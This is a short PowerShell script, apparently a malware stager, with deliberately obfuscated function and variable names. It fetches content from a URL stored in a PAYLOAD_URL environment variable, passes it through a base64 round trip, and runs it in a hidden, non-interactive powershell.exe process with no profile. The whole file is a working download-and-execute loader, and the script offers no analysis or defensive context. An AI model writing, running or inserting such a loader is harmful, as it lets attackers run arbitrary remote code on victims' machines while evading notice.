function XhYjVwJtKz {
    param (
        [string]$AaBbCcDdEe
    )

    try {
        $FfGgHhIiJj = Invoke-WebRequest -Uri $AaBbCcDdEe -TimeoutSec 10
        return $FfGgHhIiJj.Content
    }
    catch {
        return $null
    }
}

function XoRpQkZtLs {
    param (
        [string]$PpQqRrSsTt
    )

    try {
        $UuVvWwXxYy = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($PpQqRrSsTt))
        powershell.exe -NoP -NonI -W Hidden -Command $UuVvWwXxYy
    }
    catch {
    }
}

$QwErTyUuOo = $env:PAYLOAD_URL  

$VvWwXxYyZz = XhYjVwJtKz -AaBbCcDdEe $QwErTyUuOo

if ($VvWwXxYyZz) {
    $ZzYyXxWwVv = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($VvWwXxYyZz))
    XoRpQkZtLs -PpQqRrSsTt $ZzYyXxWwVv
}








